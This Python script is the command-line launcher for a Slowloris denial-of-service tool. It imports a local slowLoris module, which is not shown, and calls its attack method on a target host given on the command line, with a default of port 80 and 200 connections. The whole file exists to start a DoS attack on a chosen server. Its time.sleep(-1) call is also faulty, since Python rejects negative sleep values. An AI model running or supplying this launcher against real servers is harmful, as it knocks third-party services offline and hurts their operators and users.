import slowLoris
import sys
import time

DEFAULT_PORT = 80
DEFAULT_CONNECTION_COUNT = 200

__author__ = "Jacob Misirian"


if __name__ == '__main__':
    try:
        loris = slowLoris.SlowLoris ()
        arglen = len (sys.argv)
        
        if arglen == 2:
            loris.attack (sys.argv [1], DEFAULT_PORT, DEFAULT_CONNECTION_COUNT)
        elif arglen == 3:
            loris.attack (sys.argv [1], int (sys.argv [2]), DEFAULT_CONNECTION_COUNT)
        elif arglen == 4:
            loris.attack (sys.argv [1], int (sys.argv [2]), int (sys.argv [3]))
        else:
            print ("Error! Expected at least one argument after file path!")
            exit ()
        time.sleep (-1)
    except (KeyboardInterrupt, SystemExit):
        loris.stop ()
        exit ()